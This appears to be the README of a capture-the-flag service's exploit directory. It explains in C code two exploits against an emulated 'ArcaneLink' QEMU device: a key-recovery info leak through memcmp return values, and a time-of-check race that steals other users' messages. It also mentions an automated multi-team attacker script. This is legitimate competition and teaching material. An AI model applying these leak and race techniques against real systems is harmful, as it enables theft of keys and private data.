# ArcaneLink - Exploits

The C files in this directory are the actual exploits to run inside QEMU guests
(the VMs managed by the service), while the Python files are simple wrappers
that connect to the service, compile, upload and run the exploit on the VMs.

Additionally, [`simple_attacker.py`](./simple_attacker.py) provides a simple
weaponization of the two exploits to run on multiple teams in parallel with
automatic flag submission.

**NOTE** that in order to cross compile the exploit for AArch64 you will need a
cross compilation toolchain:

```bash
sudo apt-get install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu
```


## Exploit 1 - Info leak in check key command

[`exploit_leak_key.c`](./exploit_leak_key.c) exploits the information leak
present in the ArcaneLink device through the CHKKEY command used to check the
validity of a given key for a given UID.

To leak the key we start with a key initialized to `0xffffffffffffffff`:
```c
uint8_t key[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
```

Then for each byte in the key (8) we set the current byte to 0x0 and we invoke `CMD_CHK_KEY`, we will have 3 possible results:
```c
for (size_t i = 0; i < sizeof(key); i++) {
    key[i] = 0;

    // issue the cmd

    // ... 
    
    leak = ret & 0xffffff; // return value of the cmd

    // memcmp returned original_key[i] - 0x0
    if (leak > 0)
        key[i] = leak;
    // original_key[i] is 0x0, so memcmp returned original_key[i+1] - 0xff
    else if (leak < 0)
        key[i] = 0;
    // if ret = 0 we found the key, exit the loop
    else
        break;
}
```


## Exploit 2 - Race condition in message peek command

[`exploit_race_cond.c`](./exploit_race_cond.c) exploits the race condition
present in the ArcaneLink device when checking the supplied key in the PEEK
command.

```c
// Struct of the cmd request
typedef struct __attribute__((packed)) guest_req {
	uint32_t status;
	uint32_t cmd;
	uint32_t mid;
	uint32_t uid;
	uint64_t key;
	char buf[MSG_SZ];
} guest_req_t;
```

First we fill the current msg queue with many messages containing `"PWN"`, later we'll see why this is useful.  

Then, to win the race condition with the qemu thread we immediately start a thread that performs the `8-byte` write at `&req->mid`, this way we can bypass the check in `arcane_guest_write` and overwrite `uid` while the qemu thread is already running:
```c
// arcane_guest_write() {
// ...
    if (pgoff >= offsetof(guest_req_t, uid) &&
            pgoff < (offsetof(guest_req_t, uid) + sizeof_field(guest_req_t, uid))) {
// ...
// }
```

Our thread:
```c
static void *th(void *arg) {
	volatile guest_req_t *req = (volatile guest_req_t *)arg;
	puts("[thread] started");

	while (1) {
		*(volatile uint64_t *)&(req->mid) = ((uint64_t)target_uid) << 32 | target_msg_idx;
	}

	return NULL;
}
```

Note that in some lucky scenarios you could also win the race without using a thread (using the thread is much more reliable):
```c
// schedule CMD_PEEK_MSG
req->cmd = CMD_PEEK_MSG;

// potentially sleep for some usec

// perform write and overwrite uid
*(volatile uint64_t *)&(req->mid) = ((uint64_t)target_uid) << 32 | target_msg_idx;
```

After spawning `th` we repeatedly issue `CMD_PEEK_MSG` command in the hope that our thread changes the uid right after the `auth_uid` check but before the call to `get_qid_from_uid`:
```c
case CMD_PEEK_MSG: {
    key = req->key;

    // req->uid is read [1]
    if ((ret = auth_uid(req->uid, key)) != 0) {
        arcanelog("    [-] auth failed\n");
        ret |= STATUS_ERROR;
        break;
    }

    // HERE <-----

    // req->uid is read [2]
    qid = get_qid_from_uid(req->uid);
    if (qid == -1) {
        arcanelog("    [-] invalid uid\n");
        ret = STATUS_ERROR | ERR_INVALID_UID;
        break;
    }
```

Each time that we receive a message different from `"PWN"` we know that we stole a message from the message queue of the target uid, and in that case we increment the message index by 1 and continue the loop.

```c
// ...

fill_msgqueue(req);

// ...

pthread_create(&thread, NULL, th, (void*)req);

// ...

my_uid = getuid();
req->key = my_key;
req->mid = 0;

for (; target_msg_idx <= end_idx; target_msg_idx++) {
    size_t attempts;

    for (attempts = 1; ; attempts++) {
        req->uid = my_uid;
        req->cmd = CMD_PEEK_MSG;
        while ((status = req->status) == STATUS_BUSY) usleep(10);

        if ((status & 0xff000000) == STATUS_ERROR && (status & 0xffffff) == ERR_ENOMSG)
            goto no_more_msgs;

        if ((status & 0xff000000) == STATUS_OK) {
            // If we peek something other than the previously pushed msg,
            // we just stole a msg that is not ours
            if (strcmp((char *)req->buf, "PWN"))
                break;
        }
    }

    printf("[exploit] stolen msg at idx %" PRIu32 " (%" PRIu64 " attempts): %s\n", target_msg_idx, attempts, req->buf);
    success = true;
}
```

Note that the race can fail in two ways:  
1. Our thread changes `req->uid` before `auth_uid`, in this case the cmd will fail with `ERR_INVALID_KEY`  
2. Our thread changes `req->uid` after `get_qid_from_uid`, in this case the message will be popped from our queue  

We previously filled our message queue to distinguish between two cases:  

1. We won the race condition but the target msg has no more messages (`mid` is too big)  
2. We lost the race (previous case `2.`) and our message queue has no more messages (`mid` is too big)

By filling up our message queue we will never end in case `2.`, so whenever we receive a `ERR_ENOMSG` we know that we leaked all of the target's messages.  
